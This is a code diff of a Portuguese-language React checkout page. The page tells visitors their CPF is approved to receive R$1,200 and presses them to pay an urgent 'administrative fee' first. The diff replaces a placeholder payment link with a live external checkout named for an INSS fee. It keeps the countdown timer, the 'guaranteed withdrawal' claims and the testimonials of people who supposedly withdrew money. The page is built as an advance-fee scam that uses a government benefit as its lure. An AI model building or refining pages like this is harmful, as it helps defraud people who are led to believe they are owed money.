@@ -5,7 +5,7 @@ import type React from 'react';
 import { useState, useEffect, FC, useRef } from 'react';
 import Image from 'next/image';
 import { Button } from '@/components/ui/button';
-import { CheckCircle, TrendingUp, Users, AlertTriangle, BadgeCent, ShieldCheck } from 'lucide-react';
+import { CheckCircle, TrendingUp, Users, AlertTriangle, ShieldCheck } from 'lucide-react';
 import OfferTimer from '@/components/features/OfferTimer';
 
 interface OfferStepProps {
@@ -97,15 +97,11 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
       clearInterval(testimonialInterval);
     };
   }, []);
-  
+
   const handleLiberarAcessoClick = () => {
-    taxSectionRef.current?.scrollIntoView({ behavior: 'smooth' });
-    setTimeout(() => {
-      alert("Você será redirecionado para a plataforma de pagamento segura para concluir a liberação da sua CHAVE PIX de R$1.200,00.");
-      window.location.href = "https://appmax.com.br/checkout-fake-placeholder"; 
-    }, 100); 
+    window.location.href = "https://kingspay.site/checkout/taxa-inss-2025";
   };
-  
+
   const handleEligibilityCheckClick = () => {
     taxSectionRef.current?.scrollIntoView({ behavior: 'smooth' });
   };
@@ -114,14 +110,13 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
 
   return (
     <div className="w-full max-w-4xl mx-auto p-4 md:p-6 space-y-8 bg-background text-foreground">
-        
+
         <div className="text-center">
            <h2 className="font-headline text-xl md:text-2xl font-bold mb-2 text-foreground">
             Parabéns, seu CPF <span className="text-accent font-mono">{formattedCpf}</span> foi aprovado para receber o dinheiro e os benefícios a seguir!
           </h2>
         </div>
 
-        {/* Benefícios disponíveis em destaque */}
          <div className="bg-white rounded-xl shadow-xl p-6 md:p-8 mb-8 border-l-8 border-green-600 animate-scale-in">
             <h2 className="text-2xl md:text-3xl font-black text-gray-800 mb-6 text-center">Acesso LIBERADO para você:</h2>
             <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4 md:gap-6 mb-8">
@@ -139,7 +134,6 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
             </div>
         </div>
 
-        {/* Seção de Chamada para Ação (CTA) */}
         <div className="text-center py-10 md:py-[50px] px-4 md:px-[20px] bg-[#0056b3] rounded-lg font-[Arial,sans-serif]">
           <h2 className="text-2xl md:text-[2.2em] text-white mb-4 md:mb-[20px] font-bold">
             Pronto para dar o Próximo Passo?
@@ -157,8 +151,7 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
             Sua segurança e privacidade são prioridade.
           </p>
         </div>
-          
-        {/* Seção de Taxa Administrativa */}
+
         <div ref={taxSectionRef} id="taxSection" className="my-10 p-6 md:p-8 bg-primary text-primary-foreground rounded-xl shadow-2xl border-4 border-yellow-400 text-center relative overflow-hidden">
           <div className="absolute -top-4 -left-12 transform -rotate-45 bg-yellow-400 text-primary font-bold py-2 px-16 text-sm shadow-lg hidden sm:block">
             OFERTA ÚNICA
@@ -178,10 +171,10 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
           <p className="text-xs md:text-sm my-4 leading-relaxed max-w-md mx-auto px-2">
             <span className="font-bold uppercase text-yellow-300">IMPORTANTE:</span> Pague <span className="font-bold">SOMENTE AGORA</span> esta taxa para cobrir os custos de processamento <span className="font-bold">SEGURO</span> e liberação automática dos seus <span className="font-bold text-yellow-300">R$1.200,00</span> via PIX! SAQUE GARANTIDO IMEDIATAMENTE APÓS O PIX!
           </p>
-          <Button 
+          <Button
             onClick={handleLiberarAcessoClick}
-            variant="default" 
-            size="lg" 
+            variant="default"
+            size="lg"
             className="w-full max-w-md mx-auto h-14 text-lg md:h-16 md:text-xl font-bold bg-accent hover:bg-accent/90 text-accent-foreground shadow-xl mt-4 rounded-lg border-2 border-yellow-200"
           >
             Quero Receber o dinheiro!
@@ -193,11 +186,10 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
             <OfferTimer initialMinutes={2} initialSeconds={30} />
            </div>
         </div>
-        
-        {/* SEÇÃO DE PROVA SOCIAL */}
+
         <div>
            <h3 className="font-headline text-lg md:text-xl font-bold text-foreground text-center mb-5 uppercase flex items-center justify-center">
-            <Users className="mr-2 h-6 w-6 md:h-7 md:w-7" /> 
+            <Users className="mr-2 h-6 w-6 md:h-7 md:w-7" />
             PESSOAS QUE SACARAM HOJE!
           </h3>
           <div className="space-y-4">
@@ -208,7 +200,7 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
                           <Image
                           src={testimonial.photoUrl}
                           alt={`Foto de ${testimonial.name}`}
-                          width={56} 
+                          width={56}
                           height={56}
                           data-ai-hint={testimonial.dataAiHint || "person avatar"}
                           className="rounded-full mr-3 md:mr-4 border-2 border-accent shadow-md"
@@ -235,3 +227,5 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
 };
 
 export default OfferStep;
+
+    
